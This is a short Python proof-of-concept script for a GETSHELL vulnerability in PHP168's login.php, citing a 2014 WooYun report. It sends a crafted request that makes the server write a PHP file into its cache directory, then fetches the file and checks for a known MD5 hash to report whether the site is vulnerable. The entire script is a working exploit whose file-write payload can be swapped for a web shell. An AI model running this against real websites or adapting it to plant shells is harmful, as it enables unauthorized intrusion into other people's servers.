#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PHP168 login.php GETSHELL漏洞
referer: http://wooyun.org/bugs/wooyun-2014-050515
author: Lucifer
description: Powered by php168 v6或者一下版本v5、v4、v3、v2、v1会搜索到很多很多相关的网站,login.php文件可以把代码写入cache目录中。
'''
import sys
import requests
import warnings
def run(url):
        result = ['PHP168 login.php GETSHELL漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/login.php?makehtml=1&chdb[htmlname]=404.php&chdb[path]=cache&content=<?php%20echo%20md5(1234);?>"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            verifyurl = url + "/cache/404.php"
            req2 = requests.get(verifyurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                result[2]=  '存在'
                result[1]=verifyurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    